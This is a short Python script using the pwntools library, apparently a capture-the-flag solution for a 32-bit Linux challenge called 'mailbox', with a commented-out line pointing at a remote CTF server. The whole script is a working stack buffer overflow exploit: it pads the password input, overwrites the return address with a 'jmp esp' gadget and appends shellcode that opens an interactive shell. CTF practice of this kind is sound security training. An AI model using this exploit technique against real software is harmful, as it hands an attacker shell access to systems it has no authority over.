from pwn import *

context(arch = 'i386', os = 'linux')

PROGRAM = './mailbox'

RETURN_ADDRESS_OFFSET=18
RETURN_ADDRESS=0x0804915f  #jmp esp

USERNAME = "a"*33
PASSWORD = "a"*18 + flat(RETURN_ADDRESS) # If "a" is changed to "b" the payload does not work. Why?

PAYLOAD = USERNAME +"\n" + PASSWORD + asm(shellcraft.sh())

p = process(PROGRAM)
#p = remote("ctf2016.the-playground.dk", 12003)
p.sendline(PAYLOAD)
p.interactive()

